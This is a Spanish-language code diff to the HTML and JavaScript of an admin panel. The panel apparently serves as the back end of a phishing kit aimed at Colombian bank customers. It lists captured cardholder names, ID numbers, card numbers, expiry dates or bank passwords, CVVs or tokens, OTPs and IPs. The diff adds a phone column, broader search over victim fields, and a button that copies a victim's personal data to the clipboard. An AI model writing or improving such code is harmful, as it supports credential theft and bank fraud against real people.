@@ -328,12 +328,14 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                                 <th>Vencimiento / Clave</th>
                                 <th>CVV / Token</th>
                                 <th>OTP</th>
+                                <th>Teléfono</th> <!-- 🔥 NUEVA COLUMNA -->
                                 <th>Monto</th>
                                 <th>IP</th>
+                                <th>Acciones</th> <!-- 🔥 NUEVA COLUMNA -->
                             </tr>
                         </thead>
                         <tbody id="tbodyHistorial">
-                            <tr><td colspan="11" class="empty">Cargando...</td></tr>
+                            <tr><td colspan="13" class="empty">Cargando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -905,15 +907,15 @@ function renderHistorial() {
         lista = lista.filter(h => {
             const datos = h.datos || {};
             const texto = [
-                h.bancoKey, datos.titular, datos.docNumber, datos.tarjeta,
-                datos.identificacion, datos.token, datos.otp, datos.ip,
+                h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta,
+                datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono,
                 datos.cardBrand, datos.bankName
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
     }
     if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="11" class="empty">Sin registros en el historial</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="13" class="empty">Sin registros en el historial</td></tr>';
         actualizarBtnBorrarHistorial();
         return;
     }
@@ -924,19 +926,19 @@ function renderHistorial() {
         const banco = h.bancoKey || '-';
         const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga';
 
-        const nombre = datos.titular || '-';
+        const nombre = datos.titular || (datos.nombres ? (datos.nombres + ' ' + (datos.apellidos || '')) : '-');
         let documento = '-';
         let tarjetaCuenta = '-';
         let vencimientoClave = '-';
         let cvvToken = '-';
 
         if (esTarjeta) {
-            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
+            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : (datos.documento || '-');
             tarjetaCuenta = datos.tarjeta || '-';
             vencimientoClave = (datos.expMes || datos.expAnio) ? `${datos.expMes || '??'}/${datos.expAnio || '??'}` : '-';
             cvvToken = datos.cvv || '-';
         } else {
-            documento = datos.identificacion || '-';
+            documento = datos.identificacion || datos.documento || '-';
             tarjetaCuenta = datos.tarjeta || '-';
             vencimientoClave = datos.clave || '-';
             cvvToken = datos.token || '-';
@@ -953,8 +955,12 @@ function renderHistorial() {
                 <td class="dato">${escapeHtml(vencimientoClave)}</td>
                 <td class="dato">${escapeHtml(cvvToken)}</td>
                 <td class="dato">${escapeHtml(datos.otp || '-')}</td>
-                <td class="dato">${escapeHtml(datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-')}</td>
+                <td class="dato">${escapeHtml(datos.telefono || '-')}</td> <!-- 🔥 Teléfono -->
+                <td class="dato">${escapeHtml((datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-')}</td>
                 <td class="ip">${escapeHtml(datos.ip || '-')}</td>
+                <td>
+                    <button class="btn btn-token" onclick="copiarDatosHistorial('${escapeHtml(h.id)}')">📋 Copiar</button>
+                </td>
             </tr>
         `;
     }).join('');
@@ -967,6 +973,20 @@ function renderHistorial() {
         });
     });
     actualizarBtnBorrarHistorial();
+}
+
+function copiarDatosHistorial(id) {
+    var registro = historialCache.find(h => h.id === id);
+    if (!registro) return;
+    
+    var d = registro.datos || {};
+    var texto = `Nombre: ${d.nombres || d.titular || '-'} ${d.apellidos || ''} | Doc: ${d.documento || d.docNumber || '-'} | Tel: ${d.telefono || '-'} | Correo: ${d.correo || '-'} | Placa: ${d.placa || '-'} | Monto: ${d.monto || d.precio || '-'}`;
+    
+    navigator.clipboard.writeText(texto).then(function() {
+        toast('📋 Datos copiados al portapapeles');
+    }).catch(function() {
+        alert('No se pudo copiar. Aquí están los datos:\n\n' + texto);
+    });
 }
 
 function actualizarBtnBorrarHistorial() {
